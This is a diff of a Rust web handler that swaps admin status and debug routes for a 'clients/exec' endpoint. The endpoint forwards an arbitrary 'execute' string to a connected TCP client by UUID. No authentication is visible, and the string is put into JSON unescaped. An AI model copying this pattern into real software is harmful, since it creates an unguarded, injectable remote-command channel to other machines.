@@ -3,27 +3,21 @@ use serde_json::Value;
 use crate::socket::TcpServer;
 
 
-pub async fn admin(path:&str, parsed_json: Value, data_tcp_stream:Data<TcpServer>) -> CustomizeResponder<HttpResponse> {
+pub async fn clients(path:&str, parsed_json: Value, data_tcp_stream:Data<TcpServer>) -> CustomizeResponder<HttpResponse> {
 
 
-    if path == "admin/status" {
-        return HttpResponse::Ok().content_type("application/json").body("{\"status\": \"online\"}").customize();
-    } else if path == "admin/clients" {
-        let clients = data_tcp_stream.get_clients_str();
-        let resonse = format!("{{\"error\": false, \"clients\": {:?}}}", &clients);
-        return HttpResponse::Ok().content_type("application/json").body(resonse).customize();
-    } else if path == "admin/debug" {
-        return send_debug_message(parsed_json, data_tcp_stream).await;
+    if path == "clients/exec" {
+        return execute(parsed_json, data_tcp_stream).await;
     }
-
 
 
     return HttpResponse::Ok().content_type("application/json").body("{\"status\": \"ok\"}").customize();
 }
 
 
-async fn send_debug_message(parsed_json: Value, data_tcp_stream:Data<TcpServer>) -> CustomizeResponder<HttpResponse> {
-    
+
+pub async fn execute(parsed_json: Value, data_tcp_stream:Data<TcpServer>) -> CustomizeResponder<HttpResponse> {
+
     // get client uuid un body: client_uuid:
     let client_uuid = match parsed_json["client_uuid"].as_str() {
         Some(uuid) => uuid,
@@ -38,9 +32,10 @@ async fn send_debug_message(parsed_json: Value, data_tcp_stream:Data<TcpServer>)
         Err(_) => {
             return HttpResponse::Ok().content_type("application/json").body("{\"error\": \"true\", \"error_msg\": \"client_uuid is not valid\"}").customize();
         }
+
     };
 
-    let send = data_tcp_stream.send_debug_message(client_uuid_validated);
+    let send = data_tcp_stream.send_message(client_uuid_validated, format!("{{\"execute\": \"{}\"}}", parsed_json["execute"].as_str().unwrap()));
 
     if !send {
         return HttpResponse::Ok().content_type("application/json").body("{\"error\": \"true\", \"error_msg\": \"client_uuid not found\"}").customize();
